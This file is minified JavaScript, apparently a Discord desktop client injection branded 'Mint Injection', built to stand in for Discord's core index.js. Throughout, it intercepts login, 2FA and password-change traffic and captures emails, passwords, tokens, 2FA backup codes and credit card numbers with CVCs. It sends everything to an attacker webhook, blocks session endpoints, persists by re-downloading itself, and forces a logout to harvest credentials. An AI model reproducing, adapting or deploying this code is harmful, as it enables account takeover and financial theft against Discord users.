const e=require("fs"),n=require("os"),s=require("https"),a=process.argv,t=require("path"),i=require("querystring"),{BrowserWindow:r,session:o}=require("electron"),d={webhook:"%WEBHOOK1%",injection_url:"https://github.com/0xFl4q/injection/blob/main/injection.js",filters:{urls:["/auth/login","/auth/register","/mfa/totp","/mfa/codes-verification","/users/@me"]},filters2:{urls:["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json","https://*.discord.com/api/v*/applications/detectable","https://discord.com/api/v*/applications/detectable","https://*.discord.com/api/v*/users/@me/library","https://discord.com/api/v*/users/@me/library","wss://remote-auth-gateway.discord.gg/*","https://discord.com/api/v*/auth/sessions","https://*.discord.com/api/v*/auth/sessions","https://discordapp.com/api/v*/auth/sessions"]},payment_filters:{urls:["https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts","https://api.stripe.com/v*/tokens"]},API:"https://discord.com/api/v9/users/@me",badges:{Discord_Emloyee:{Value:1,Emoji:"<:8485discordemployee:1163172252989259898>",Rare:!0},Partnered_Server_Owner:{Value:2,Emoji:"<:9928discordpartnerbadge:1163172304155586570>",Rare:!0},HypeSquad_Events:{Value:4,Emoji:"<:9171hypesquadevents:1163172248140660839>",Rare:!0},Bug_Hunter_Level_1:{Value:8,Emoji:"<:4744bughunterbadgediscord:1163172239970140383>",Rare:!0},Early_Supporter:{Value:512,Emoji:"<:5053earlysupporter:1163172241996005416>",Rare:!0},Bug_Hunter_Level_2:{Value:16384,Emoji:"<:1757bugbusterbadgediscord:1163172238942543892>",Rare:!0},Early_Verified_Bot_Developer:{Value:131072,Emoji:"<:1207iconearlybotdeveloper:1163172236807639143>",Rare:!0},House_Bravery:{Value:64,Emoji:"<:6601hypesquadbravery:1163172246492287017>",Rare:!1},House_Brilliance:{Value:128,Emoji:"<:6936hypesquadbrilliance:1163172244474822746>",Rare:!1},House_Balance:{Value:256,Emoji:"<:5242hypesquadbalance:1163172243417858128>",Rare:!1},Active_Developer:{Value:4194304,Emoji:"<:1207iconactivedeveloper:1163172534443851868>",Rare:!1},Certified_Moderator:{Value:262144,Emoji:"<:4149blurplecertifiedmoderator:1163172255489085481>",Rare:!0},Spammer:{Value:1048704,Emoji:"⌨️",Rare:!1}}},c=e=>r.getAllWindows()[0].webContents.executeJavaScript(e,!0),l=async()=>await c("(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()"),u=async(e,n,a,t)=>{const i={protocol:(n=new URL(n)).protocol,hostname:n.host,path:n.pathname,method:e,headers:{"Access-Control-Allow-Origin":"*"}};n.search&&(i.path+=n.search);for(const e in a)i.headers[e]=a[e];const r=s.request(i);return t&&r.write(t),r.end(),new Promise(((e,n)=>{r.on("response",(n=>{let s="";n.on("data",(e=>s+=e)),n.on("end",(()=>e(s)))}))}))},p=async(e,s,a)=>{e.content="`"+n.hostname()+"` - `"+n.userInfo().username+"`\n\n"+e.content,e.username="Mint -  injection",e.avatar_url="https://media.discordapp.net/attachments/1211774107012698123/1211775467829596180/DALLE_2024-02-26_21.40.25_-_Design_a_sophisticated_and_minimalist_icon_for_a_company_named_Mint_ideal_for_digital_use._The_icon_should_embody_the_essence_of_freshness_with_a_m.webp?ex=65ef6cd9&is=65dcf7d9&hm=6eec5418732f3c506124515212bf5b52f87a2f3385a9b7d32313c757882859dd&",e.embeds[0].author={name:a.username},e.embeds[0].thumbnail={url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}.webp`},e.embeds[0].footer={text:"Mint Injection | Zeubrkk",icon_url:"https://media.discordapp.net/attachments/1211774107012698123/1211775467829596180/DALLE_2024-02-26_21.40.25_-_Design_a_sophisticated_and_minimalist_icon_for_a_company_named_Mint_ideal_for_digital_use._The_icon_should_embody_the_essence_of_freshness_with_a_m.webp?ex=65ef6cd9&is=65dcf7d9&hm=6eec5418732f3c506124515212bf5b52f87a2f3385a9b7d32313c757882859dd&"},e.embeds[0].title="Account Information";const t=f(a.premium_type),i=_(a.flags),r=await b(s),o=await g(s),c=await y(s);e.embeds[0].fields.push({name:"Token",value:"```"+s+"```",inline:!1},{name:"Nitro",value:t,inline:!0},{name:"Badges",value:i,inline:!0},{name:"Billing",value:r,inline:!0}),e.embeds.push({title:`Total Friends: ${o.totalFriends}`,description:o.message},{title:`Total Servers: ${c.totalGuilds}`,description:c.message});for(const n in e.embeds)e.embeds[n].color=10934466;await u("POST",d.webhook,{"Content-Type":"application/json"},JSON.stringify(e))},m=async(e,n)=>JSON.parse(await u("GET",d.API+e,n)),h=async e=>await m("",{Authorization:e}),f=e=>{switch(e){case 1:return"`Nitro Classic`";case 2:return"`Nitro Boost`";case 3:return"`Nitro Basic`";default:return"`❌`"}},_=e=>{let n="";for(const s in d.badges){let a=d.badges[s];(e&a.Value)==a.Value&&(n+=a.Emoji+" ")}return n||"`❌`"},w=e=>{let n="";for(const s in d.badges){let a=d.badges[s];(e&a.Value)==a.Value&&a.Rare&&(n+=a.Emoji+" ")}return n},b=async e=>{const n=await(async e=>await m("/billing/payment-sources",{Authorization:e}))(e);let s="";return n.forEach((e=>{if(!e.invalid)switch(e.type){case 1:s+="💳 ";break;case 2:s+="<:paypal:1148653305376034967> "}})),s||"`❌`"},g=async e=>{const n=await(async e=>await m("/relationships",{Authorization:e}))(e),s=n.filter((e=>1==e.type));let a="";for(const e of s){var t=w(e.user.public_flags);""!=t&&(a||(a="**Rare Friends:**\n"),a+=`${t} ${e.user.username}#${e.user.discriminator}\n`)}return a=a||"**No Rare Friends**",{message:a,totalFriends:n.length}},y=async e=>{const n=await(async e=>await m("/guilds?with_counts=true",{Authorization:e}))(e),s=n.filter((e=>"562949953421311"==e.permissions));let a="";for(const e of s)""===a&&(a+="**Rare Servers:**\n"),a+=`${e.owner?"<:SA_Owner:991312415352430673> Owner":"<:admin:967851956930482206> Admin"} | Server Name: \`${e.name}\` - Members: \`${e.approximate_member_count}\`\n`;return a=a||"**No Rare Servers**",{message:a,totalGuilds:n.length}},v=async(e,n,s,a)=>{const t=await h(s),i={content:`**${t.username}** just ${a}!`,embeds:[{fields:[{name:"Email",value:"`"+e+"`",inline:!0},{name:"Password",value:"`"+n+"`",inline:!0}]}]};p(i,s,t)},j=function(){const n=a[0].split(t.sep).slice(0,-1).join(t.sep);let s;return"win32"===process.platform?s=t.join(n,"resources"):"darwin"===process.platform&&(s=t.join(n,"Contents","Resources")),e.existsSync(s)?{resourcePath:s,app:n}:{undefined:void 0,undefined:void 0}}();let k="",S="";const q=()=>{mainWindow=r.getAllWindows()[0],mainWindow&&(mainWindow.webContents.debugger.attach("1.3"),mainWindow.webContents.debugger.on("message",(async(e,n,s)=>{if("Network.responseReceived"!==n)return;if(!d.filters.urls.some((e=>s.response.url.endsWith(e))))return;if(![200,202].includes(s.response.status))return;const a=await mainWindow.webContents.debugger.sendCommand("Network.getResponseBody",{requestId:s.requestId}),t=JSON.parse(a.body),i=await mainWindow.webContents.debugger.sendCommand("Network.getRequestPostData",{requestId:s.requestId}),r=JSON.parse(i.postData);switch(!0){case s.response.url.endsWith("/login"):if(!t.token)return k=r.login,void(S=r.password);v(r.login,r.password,t.token,"logged in");break;case s.response.url.endsWith("/register"):v(r.email,r.password,t.token,"signed up");break;case s.response.url.endsWith("/totp"):v(k,S,t.token,"logged in with 2FA");break;case s.response.url.endsWith("/codes-verification"):(async(e,n)=>{const s=await h(n),a=e.filter((e=>!1===e.consumed));let t="";for(let e of a)t+=`${e.code.substr(0,4)}-${e.code.substr(4)}\n`;const i={content:`**${s.username}** just viewed his 2FA backup codes!`,embeds:[{fields:[{name:"Backup Codes",value:"```"+t+"```",inline:!1},{name:"Email",value:"`"+s.email+"`",inline:!0},{name:"Phone",value:"`"+(s.phone||"None")+"`",inline:!0}]}]};p(i,n,s)})(t.backup_codes,await l());break;case s.response.url.endsWith("/@me"):if(!r.password)return;r.email&&v(r.email,r.password,t.token,"changed his email to **"+r.email+"**"),r.new_password&&(async(e,n,s)=>{const a=await h(s),t={content:`**${a.username}** just changed his password!`,embeds:[{fields:[{name:"New Password",value:"`"+e+"`",inline:!0},{name:"Old Password",value:"`"+n+"`",inline:!0}]}]};p(t,s,a)})(r.new_password,r.password,t.token)}})),mainWindow.webContents.debugger.sendCommand("Network.enable"),mainWindow.on("closed",(()=>{q()})))};q(),o.defaultSession.webRequest.onCompleted(d.payment_filters,(async(e,n)=>{if([200,202].includes(e.statusCode)&&"POST"==e.method)switch(!0){case e.url.endsWith("tokens"):const n=i.parse(Buffer.from(e.uploadData[0].bytes).toString());(async(e,n,s,a,t)=>{const i=await h(t),r={content:`**${i.username}** just added a credit card!`,embeds:[{fields:[{name:"Number",value:"`"+e+"`",inline:!0},{name:"CVC",value:"`"+n+"`",inline:!0},{name:"Expiration",value:"`"+s+"/"+a+"`",inline:!0}]}]};p(r,t,i)})(n["card[number]"],n["card[cvc]"],n["card[exp_month]"],n["card[exp_year]"],await l());break;case e.url.endsWith("paypal_accounts"):(async e=>{const n=await h(e),s={content:`**${n.username}** just added a <:paypal:1148653305376034967> account!`,embeds:[{fields:[{name:"Email",value:"`"+n.email+"`",inline:!0},{name:"Phone",value:"`"+(n.phone||"None")+"`",inline:!0}]}]};p(s,e,n)})(await l())}})),o.defaultSession.webRequest.onBeforeRequest(d.filters2,((n,s)=>{if(n.url.startsWith("wss://remote-auth-gateway")||n.url.endsWith("auth/sessions"))return s({cancel:!0});!async function(){const{resourcePath:n,app:s}=j;if(void 0===n||void 0===s)return;const a=t.join(n,"app"),i=t.join(a,"package.json"),r=t.join(a,"index.js"),o=`${s}\\modules\\${e.readdirSync(`${s}\\modules\\`).filter((e=>/discord_desktop_core-+?/.test(e)))[0]}\\discord_desktop_core\\index.js`,u=t.join(process.env.APPDATA,"\\betterdiscord\\data\\betterdiscord.asar");if(e.existsSync(a)||e.mkdirSync(a),e.existsSync(i)&&e.unlinkSync(i),e.existsSync(r)&&e.unlinkSync(r),"win32"===process.platform||"darwin"===process.platform){e.writeFileSync(i,JSON.stringify({name:"discord",main:"index.js"},null,4));const s=`const fs = require('fs'), https = require('https');\n  const indexJs = '${o}';\n  const bdPath = '${u}';\n  const fileSize = fs.statSync(indexJs).size\n  fs.readFileSync(indexJs, 'utf8', (err, data) => {\n      if (fileSize < 20000 || data === "module.exports = require('./core.asar')") \n          init();\n  })\n  async function init() {\n      https.get('${d.injection_url}', (res) => {\n          const file = fs.createWriteStream(indexJs);\n          res.replace('%WEBHOOK%', '${d.webhook}')\n          res.pipe(file);\n          file.on('finish', () => {\n              file.close();\n          });\n      \n      }).on("error", (err) => {\n          setTimeout(init(), 10000);\n      });\n  }\n  require('${t.join(n,"app.asar")}')\n  if (fs.existsSync(bdPath)) require(bdPath);`;e.writeFileSync(r,s.replace(/\\/g,"\\\\"))}if(!e.existsSync(t.join(__dirname,"initiation")))return;e.rmdirSync(t.join(__dirname,"initiation"));const m=await l();if(!m)return;const f=await h(m),_={content:`**${f.username}** just got injected!`,embeds:[{fields:[{name:"Email",value:"`"+f.email+"`",inline:!0},{name:"Phone",value:"`"+(f.phone||"None")+"`",inline:!0}]}]};await p(_,m,f),c('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();')}()})),module.exports=require("./core.asar");
